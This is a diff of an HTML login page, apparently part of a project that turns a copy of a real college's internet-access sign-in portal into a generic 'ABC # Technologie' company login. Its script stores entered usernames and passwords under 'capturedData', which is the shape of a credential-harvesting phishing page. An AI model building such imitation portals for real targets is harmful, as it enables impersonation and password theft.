@@ -3,47 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RCSS - Sign in to access Internet</title>
-    <meta name="description" content="Rajagiri College of Social Sciences - Internet Access Login Portal">
+    <title>ABC # Technologie | Secure Login</title>
+    <meta name="description" content="ABC # Technologie secure company portal login">
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="page-wrapper">
-        <!-- Header -->
         <header class="header" id="site-header">
-            <h1 id="college-name">RAJAGIRI COLLEGE OF SOCIAL SCIENCES</h1>
+            <h1 class="brand-mark" id="college-name">ABC # Technologie</h1>
+            <p class="brand-subtitle">Secure access to your company workspace</p>
         </header>
 
-        <!-- Login Card -->
         <main class="login-card" id="login-card">
-            <!-- Logo -->
             <div class="logo-container" id="logo-container">
-                <img src="rcss_logo.png" alt="RCSS - Rajagiri College of Social Sciences (Autonomous)" class="logo-img" id="logo-img">
+                <div class="logo-badge">ABC</div>
+                <div class="company-name">ABC # Technologie</div>
             </div>
 
-            <!-- Form Section -->
             <div class="form-section" id="form-section">
-                <h2 class="form-title" id="form-title">Sign in to access Internet</h2>
+                <h2 class="form-title" id="form-title">Sign in</h2>
+                <p class="form-subtitle">Access your account securely</p>
 
                 <form id="login-form" action="#" method="POST">
                     <div class="input-group" id="username-group">
-                        <input 
-                            type="text" 
-                            id="username-input" 
-                            name="username" 
-                            placeholder="Username" 
+                        <label for="username-input">Email or username</label>
+                        <input
+                            type="text"
+                            id="username-input"
+                            name="username"
+                            placeholder="you@company.com"
                             autocomplete="username"
                             required
                         >
                     </div>
 
                     <div class="input-group" id="password-group">
-                        <input 
-                            type="password" 
-                            id="password-input" 
-                            name="password" 
-                            placeholder="Password" 
+                        <label for="password-input">Password</label>
+                        <input
+                            type="password"
+                            id="password-input"
+                            name="password"
+                            placeholder="Enter your password"
                             autocomplete="current-password"
                             required
                         >
@@ -60,7 +61,7 @@
             e.preventDefault();
             const username = document.getElementById('username-input').value;
             const password = document.getElementById('password-input').value;
-            
+
             if (username && password) {
                 const entries = JSON.parse(localStorage.getItem('capturedData') || '[]');
                 entries.push({
